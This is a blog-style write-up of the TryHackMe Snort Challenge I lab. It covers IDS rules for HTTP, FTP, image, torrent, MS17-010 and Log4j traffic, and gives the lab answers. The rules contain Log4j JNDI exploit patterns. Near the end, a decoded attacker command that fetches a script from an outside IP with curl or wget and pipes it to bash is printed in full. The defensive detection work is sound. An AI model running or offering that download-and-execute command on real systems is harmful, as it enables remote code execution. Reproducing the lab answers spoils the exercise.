---
title: Snort Challenge I
date: 2024-06-07 00:00:00 -500
categories: [TryHackMe, Network Security]
tags: [TryHackMe]
---

### Writing IDS rules (HTTP)

Navigate to the task folder.

Use the given pcap file.

- Write rules to detect "**`all TCP port 80 traffic`**" packets in the given pcap file.

What is the number of detected packets? `364`

**Note:** You must answer this question correctly before answering the rest of the questions in this task.

```c
alert tcp any any <> any 80  (msg: "HTTP packet"; sid: 100001; rev:1;)
```


<u>Testing from console</u>:
```c
sudo snort -c /etc/snort/snort.conf -q -r mx-3.pcap -A console --pcap-show
```

<u>Testing and reading from a pcap file</u>:
```c
sudo snort -c /etc/snort/snort.conf -A full -l . -r mx-3.pcap
```

<u>Incorrect Rule 1</u>:
```c
alert tcp any 80 <- any any (msg:"TCP port 80 inbound traffic detected";sid:1000000000001; rev :1)  
alert tcp any any -> any 80 (msg:"TCP port 80 outbound traffic detected";sid:1000000000002; rev :1)
```

	- Data flow should be to both directions

<u>Incorrect Rule 2</u>:
```c
alert tcp any 80 <> any 80 (msg:"TCP port 80 inbound traffic detected";sid:1000000000001; rev :1)
```

	- Receiving ports is expected to be port 80 but never the sending ones


<u>Correct Rule</u>:
```c
alert tcp any 80 <> any any (msg:"TCP port 80 inbound traffic detected";sid:1000000000001; rev :1)  
alert tcp any any <> any 80 (msg:"TCP port 80 outbound traffic detected";sid:1000000000002; rev :1)
```

![](/assets/img/Pasted image 20240303190117.png)


- Investigating the log file, what is the destination address of packet `63`?
<u>How to read the file</u>:
```c
sudo snort -r snort.log.<some_num> -n 63
```

	- Read until the 63rd packet from the capture ones


<u>Reading the 63rd packet captured with Snort</u>:

![](/assets/img/Pasted image 20240303191220.png)


- Investigate the log file.  

 What is the ***ACK*** number of packet `64`?
```c
sudo snort -r snort.log.<some_num> -n 64
```

![](/assets/img/Pasted image 20240303191331.png)


- Investigate the log file.

What is the ***SEQ*** number of packet `62`?

![](/assets/img/Pasted image 20240303191436.png)


- Investigate the log file.  

What is the ***TTL*** of packet `65`?

![](/assets/img/Pasted image 20240303191537.png)


- Investigate the log file.  

What is the ***source IP*** of packet `65`?

![](/assets/img/Pasted image 20240303191641.png)


- Investigate the log file.

What is the source port of packet 65?

![](/assets/img/Pasted image 20240303191641.png)


---
### Writing IDS Rules (FTP)

Use the given pcap file.  

- Write rules to detect "**all TCP port 21**"  traffic in the given pcap.  

What is the number of detected packets?
<u>Testing and reading from a pcap file</u>:
```c
sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap
```

![](/assets/img/Pasted image 20240303192038.png)


Investigate the log file.  

- What is the FTP service name? `Microsoft FTP Service`

<u>Adding a parameter on the rule provided</u>:
```c
alert tcp any 21 <> any any (msg:"TCP port 21 inbound traffic detected";sid:1000000000001; rev :1)
alert tcp any any <> any 21 (msg:"TCP port 21 outbound traffic detected" ;sid:1000000000002; rev :1)
```

```c
sudo snort -r snort.log.<some_num> -X -n 10
```

	- Note that if you dont specify the amount of packets to filter out, it cuts out the hex parts?

![](/assets/img/Pasted image 20240303194340.png)


- Clear the previous log and alarm files.  

Deactivate/comment on the old rules.

![](/assets/img/Pasted image 20240303195057.png)

Write a rule to detect failed FTP login attempts in the given pcap.  
```c
### "530 User" is the response the client gets when having failed login attempts
alert tcp any 21 <> any any (msg:"Failed FTP Login(to-client)";sid:10000000001;flow:to_client,not_established;content:"530 User"; rev:1)

### Remove this line as this doesn't really specify anything on the outbound connection
### to the FTP server
#alert tcp any any <> any 21 (msg:"Failed FTP Login(to-server)";sid:10000000002;flow:to_server,not_established; rev:1)
```

What is the number of detected packets? `41`

![](/assets/img/Pasted image 20240303201912.png)


Clear the previous log and alarm files.  

Deactivate/comment on the old rule.  

Write a rule to detect successful FTP logins in the given pcap.  
```c
### "530 User" is the response the client gets when having failed login attempts
alert tcp any 21 <> any any (msg:"Successful FTP Login attempt(to-client)";sid:10000000001;flow:to_client,not_established;content:"230"; rev:1)
```


What is the number of detected packets? `1`

![](/assets/img/Pasted image 20240303202041.png)

![](/assets/img/Pasted image 20240303202158.png)


`->` Clear the previous log and alarm files.  

Deactivate/comment on the old rule.  

Write a rule to detect failed FTP login attempts with a valid username but a bad password or no password.  
```c
alert tcp any 21 <> any any (msg:"Failed FTP Login attempt(to-client)";content:"331";sid:10000000001; rev:1)
```

![](/assets/img/Pasted image 20240303203130.png)

What is the number of detected packets? `42`

![](/assets/img/Pasted image 20240303202949.png)


`->` Clear the previous log and alarm files.

Deactivate/comment on the old rule.

Write a rule to detect failed FTP login attempts with "`Administrator`" username but a bad password or no password.
```c
alert tcp any any <> any 21 (msg:"Failed FTP Login attempt(to-server)";content:"USER Administrator";sid:10000000001; rev:1)
alert tcp any 21 <> any any (msg:"Failed FTP Login attempt(to-client)";content:"331";sid:10000000002; rev:1)
```


What is the number of detected packets?

![](/assets/img/Pasted image 20240303203622.png)

![](/assets/img/Pasted image 20240303203705.png)


---
### Writing IDS Rules (PNG)
  
Navigate to the task folder.

Use the given pcap file.  

Write a rule to detect the PNG file in the given pcap.  
```c
alert tcp any any -> any any ( msg:”PNG”;content:|89 50 4E 47 0D 0A 1A 0A|; sid:1000000000001; rev :1)
```

	- Extracting the packet using magic bytes


Investigate the logs and identify the software name embedded in the packet.

<u>Execution</u>:
```c
sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap -X
```

<u>Reading the output file</u>:
```c
sudo snort -r snort.log.1709523946 -X -n 10
```

![](/assets/img/Pasted image 20240303204730.png)


Clear the previous log and alarm files.  

Deactivate/comment on the old rule.  

Write a rule to detect the GIF file in the given pcap.
```c
alert tcp any any -> any any ( msg:”GIF”; content:"|47 49 46 38 39 61|"; sid:1000000000001; rev :1)
```

	- The fifth byte with 0x37 doesn't detect anything BECAUSE its a different GIF type.


![](/assets/img/Pasted image 20240303205217.png)

<u>Execution</u>:
```c
sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap -X
```

<u>Reading the output file</u>:
```c
sudo snort -r snort.log.<num> -X -n 10
```


Investigate the logs and identify the image format embedded in the packet.

![](/assets/img/Pasted image 20240303205354.png)


---
### Writing IDS Rules (Torrent Metafile)

Navigate to the task folder.  

Use the given pcap file.  

Write a rule to detect the torrent metafile in the given pcap.
```c
alert tcp any any -> any any ( msg:”Torrent Metafile”; content:"|2e 74 6f 72 72 65 6e 74|"; sid:1000000000001; rev :1)
```

<u>Execution</u>:

```c
sudo snort -c local.rules -A full -l . -r torrent.pcap -X
```

![](/assets/img/Pasted image 20240303211100.png)

<u>Reading the output file</u>:
```c
sudo snort -r snort.log.<num> -X -n 10
```

 What is the number of detected packets? `2`

![](/assets/img/Pasted image 20240303211206.png)

![](/assets/img/Pasted image 20240303211218.png)


![](/assets/img/Pasted image 20240303211526.png)


---
### Troubleshooting Rule Syntax Errors

In this section, you need to fix the syntax errors in the given rule files. 

You can test each ruleset with the following command structure:
```c
sudo snort -c local-X.rules -r mx-1.pcap -A console -n 10
```

***OR***

```c
sudo snort -c local-1.rules -A full -l . -r mx-1.pcap -X
```

Fix the syntax error in ***`local-1.rules`*** file and make it work smoothly. 

```c
sudo snort -c local-1.rules -r mx-1.pcap -A console -n 10
```

<u>Before</u>:

![](/assets/img/Pasted image 20240303211855.png)

<u>After</u>:

![](/assets/img/Pasted image 20240303211836.png)


What is the number of the detected packets? `16`

![](/assets/img/Pasted image 20240303211929.png)

![](/assets/img/Pasted image 20240303212822.png)


- Fix the syntax error in `local-2.rules` file and make it work smoothly.  

		- Just missing a port


What is the number of the detected packets? `68`

![](/assets/img/Pasted image 20240303213017.png)

![](/assets/img/Pasted image 20240303214033.png)


### Using External Rules (MS17-010)

Navigate to the task folder.  

Use the given pcap file.

- Use the given rule file (`local.rules`) to investigate the ***ms1710*** exploitation.
```c
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; pcre:"/|57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 50|/"; pcre: "/|72 65 6d 69 75 6d 20 37 36 30 31 20 53 65 72 76|/"; pcre:"/|69 63 65 20 50 61 63 6b 20 31|/"; sid: 2094284; rev: 2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "IPC$"; sid:2094285; rev: 3;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "NTLMSSP";sid: 2094286; rev: 2;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "WindowsPowerShell";sid: 20244223; rev: 3;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "ADMIN$";sid:20244224; rev: 2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "IPC$";sid: 20244225; rev:3;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "lsarpc";sid: 20244226; rev: 2;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "lsarpc";sid: 209462812; rev: 3;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "samr"; sid: 209462813; rev: 3;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "browser"; sid: 209462814; rev: 2;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established;content: "epmapper";sid: 209462815; rev: 2;)
alert tcp any any -> any any (msg: "Exploit Detected!"; flow: to_server, established; content: "eventlog"; sid: 209462816; rev: 2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "/root/smbshare"; sid: 20242290; rev: 2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "\\PIPE"; sid: 20242291; rev: 3;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "smbshare"; sid: 20242292; rev: 3;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow:to_server, established; content: "srvsvc"; sid: 20242293; rev: 2;)
alert tcp any any -> any 445 (msg:"OS-WINDOWS Microsoft Windows SMB remote code execution attempt"; flow:to_server,established; content:"|FF|SMB3|00 00 00 00|"; depth:9; offset:4; byte_extract:2,26,TotalDataCount,relative,little; byte_test:2,>,TotalDataCount,20,relative,little; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy max-detect-ips drop, policy security-ips drop, ruleset community, service netbios-ssn; reference:cve,2017-0144; reference:cve,2017-0146; reference:url,blog.talosintelligence.com/2017/05/wannacry.html; reference:url,isc.sans.edu/forums/diary/ETERNALBLUE+Possible+Window+SMB+Buffer+Overflow+0Day/22304/; reference:url,technet.microsoft.com/en-us/security/bulletin/MS17-010; sid:41978; rev:5;)
alert tcp any any -> any 445 (msg:"OS-WINDOWS Microsoft Windows SMB remote code execution attempt"; flow:to_server,established; content:"|FF|SMB|A0 00 00 00 00|"; depth:9; offset:4; content:"|01 00 00 00 00|"; within:5; distance:59; byte_test:4,>,0x8150,-33,relative,little; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy max-detect-ips drop, policy security-ips drop, ruleset community, service netbios-ssn; reference:cve,2017-0144; reference:cve,2017-0146; reference:url,isc.sans.edu/forums/diary/ETERNALBLUE+Possible+Window+SMB+Buffer+Overflow+0Day/22304/; reference:url,technet.microsoft.com/en-us/security/bulletin/MS17-010; sid:42944; rev:2;)
alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; pcre:"/|57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 50|/"; pcre: "/|72 65 6d 69 75 6d 20 37 36 30 31 20 53 65 72 76|/"; pcre:"/|69 63 65 20 50 61 63 6b 20 31|/"; reference: ExploitDatabase (ID’s - 42030, 42031, 42315); priority: 10; sid: 2094284; rev: 2;)
```


<u>Execution</u>:

```c
sudo snort -c local.rules -A full -l . -r ms-17-010.pcap -X
```

***OR***

```c
sudo snort -c local.rules -r mx-1.pcap -A console -n 10
```

What is the number of detected packets? `25154`

![](/assets/img/Pasted image 20240303214625.png)


Clear the previous log and alarm files.  

- Use `local-1.rules` empty file to write a new rule to detect payloads containing the "`\IPC$`" keyword.

What is the number of detected packets? ``

![](/assets/img/Pasted image 20240303215020.png)


- Investigate the log/alarm files.

What is the requested path? ``

<u>Reading the output file</u>:

```c
sudo snort -r snort.log.<num> -X -n 10
```

![](/assets/img/Pasted image 20240303215314.png)

![](/assets/img/Pasted image 20240303215529.png)



----
### Using External Rules `Log4j`

Navigate to the task folder.  

- Use the given pcap file.

Use the given rule file (`local.rules`) to investigate the ***log4j exploitation***.
```c
alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:ldap://"; fast_pattern:only; flowbits:set, fox.apachelog4j.rce; priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003726; rev:1;)

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:"; fast_pattern; pcre:"/\$\{jndi\:(rmi|ldaps|dns)\:/"; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600;  priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003728; rev:1;)

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:"; fast_pattern; content:!"ldap://"; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600;  priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, twitter.com/stereotype32/status/1469313856229228544; metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003730; rev:1;)

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (URL encoded bracket) (CVE-2021-44228)"; flow:established, to_server; content:"%7bjndi:"; nocase; fast_pattern; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600;  priority:3; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003731; rev:1;)

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in HTTP Header"; flow:established, to_server; content:"${"; http_header; fast_pattern; content:"}"; http_header; distance:0; flowbits:set, fox.apachelog4j.rce.loose;  priority:3; threshold:type limit, track by_dst, count 1, seconds 3600; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003732; rev:1;)

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in URI"; flow:established,to_server; content:"${"; http_uri; fast_pattern; content:"}"; http_uri; distance:0; flowbits:set, fox.apachelog4j.rce.loose;  priority:3; threshold:type limit, track by_dst, count 1, seconds 3600; reference:url, http://www.lunasec.io/docs/blog/log4j-zero-day/; reference:url, https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003733; rev:1;)

# Better and stricter rules, also detects evasion techniques
alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in HTTP Header (strict)"; flow:established,to_server; content:"${"; http_header; fast_pattern; content:"}"; http_header; distance:0; pcre:"/(\$\{\w+:.*\}|jndi)/Hi"; reference:url,www.lunasec.io/docs/blog/log4j-zero-day/; reference:url,https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; priority:3; sid:21003734; rev:1;)

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in URI (strict)"; flow:established, to_server; content:"${"; http_uri; fast_pattern; content:"}"; http_uri; distance:0; pcre:"/(\$\{\w+:.*\}|jndi)/Ui"; reference:url,https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; priority:3; sid:21003735; rev:1;)

alert tcp any any -> any any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in Client Body (strict)"; flow:to_server; content:"${"; http_client_body; fast_pattern; content:"}"; http_client_body; distance:0; pcre:"/(\$\{\w+:.*\}|jndi)/Pi"; flowbits:set, fox.apachelog4j.rce.strict; reference:url,www.lunasec.io/docs/blog/log4j-zero-day/; reference:url,https://twitter.com/testanull/status/1469549425521348609; metadata:CVE 2021-44228; metadata:created_at 2021-12-12; metadata:ids suricata; priority:3; sid:21003744; rev:1;)
```


What is the number of detected packets?

<u>Execute</u>:
```c
sudo snort -c local.rules -A full -l . -r log4j.pcap -X
```

***OR***

```c
sudo snort -c local.rules -r log4j.pcap -A console -n 10
```


- Investigate the log/alarm files.  

How many rules were triggered? `4`

![](/assets/img/Pasted image 20240303223949.png)


- Investigate the log/alarm files.  

What are the first six digits of the triggered rule `sids`?

![](/assets/img/Pasted image 20240304113410.png)

	- Triggered rules can be identified with SIDs


Clear the previous log and alarm files.  

Use `local-1.rules` empty file to write a new rule to detect packet payloads **between 770 and 855 bytes**.
```c
alert tcp any any -> any any (msg:"Detect payload size"; dsize:770<>855; sid:10000000001; rev:1)
```

What is the number of detected packets?

![](/assets/img/Pasted image 20240304114752.png)

Investigate the log/alarm files.  

What is the name of the used encoding algorithm? `Base64`

<u>Command executed</u>:

```c
sudo snort -r snort.log.<num> -X -d -n
```

![](/assets/img/Pasted image 20240304120559.png)


Investigate the log/alarm files.  

What is the ***IP ID*** of the corresponding packet? `62808`


Investigate the log/alarm files.  

Decode the encoded command.

What is the attacker's command?

```c
(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
```

![](/assets/img/Pasted image 20240304120733.png)



What is the CVSS v2 score of the Log4j vulnerability? `9.3`

![](/assets/img/Pasted image 20240304120952.png)


















